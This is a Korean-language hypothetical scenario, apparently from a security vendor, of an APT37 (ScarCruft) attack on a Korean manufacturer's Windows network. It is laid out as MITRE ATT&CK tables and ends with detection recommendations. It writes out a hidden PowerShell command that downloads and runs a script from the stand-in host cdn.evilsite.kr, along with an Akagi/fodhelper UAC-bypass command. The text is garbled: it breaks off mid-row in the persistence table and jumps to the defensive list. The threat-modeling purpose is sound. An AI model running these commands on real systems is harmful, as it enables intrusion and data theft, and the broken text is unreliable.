# APT37(ScarCruft) — 가상의 Windows 침투 시나리오

## 가정 환경

* **대상**: 한국 소재 제조업 본사 네트워크 (Windows 10/11 클라이언트)
* **모니터링**: 기본 이벤트 로그 + Sysmon v13 구성
* **보안 설정**: UAC 기본값 유지 (EnableLUA = 1)
* **목표**: R\&D 설계 도면 탈취 후 내부 중요 PC 파괴

---

## 1️⃣ 초기 침투 (Initial Access / Execution)

| 순서  | TID                                   | 행위                          | 사용 명령·기술                |
| --- | ------------------------------------- | --------------------------- | ----------------------- |
| 1-1 | T1566.001 – Spear Phishing Attachment | 팀장에게 악성 한글(HWP) 문서 첨부 메일 발송 | 악성 HWP 파일 전송            |
| 1-2 | T1204.002 – User Execution            | 사용자가 문서 열람, 매크로 실행          | HWP 매크로 내 PowerShell 호출 |
| 1-3 | T1105 – Ingress Tool Transfer         | 최종 백도어(Dolphin) 다운로드 및 실행   | PowerShell IEX 다운로드     |

```powershell
powershell -ep bypass -w hidden -c "IEX (New-Object Net.WebClient).DownloadString('http://cdn.evilsite.kr/dropper.ps1')"
```

---

## 2️⃣ 권한 상승·지속화 (Privilege Escalation / Persistence)

| 순서  | TID                                     | 행위                         | 사용 명령·기술                                       |
| --- | --------------------------------------- | -------------------------- | ---------------------------------------------- |
| 2-1 | T1548.002 – Bypass User Account Control | UAC 우회 (Akagi + fodhelper) | `.\Akagi64.exe 30 C:\Windows\System32\cmd.exe` |
| 2-2 | T1547.001 – Registry Run Keys           | Run 키 등록으로 료

* 의심스러운 HWP/LNK 첨부 파일 차단 및 정밀 검사
* PowerShell IEX 및 Base64 인코딩 탐지 정책 강화
* Sysmon + PLURA-XDR 기반의 로그 상관 분석
* PLURA-EDR 통한 Akagi 실행·UAC 우회 패턴 탐지
* LNK 및 예약 작업 생성 탐지 정책 설정 필수

👉 [자세히](plura_waf_xdr_detection.md)

---
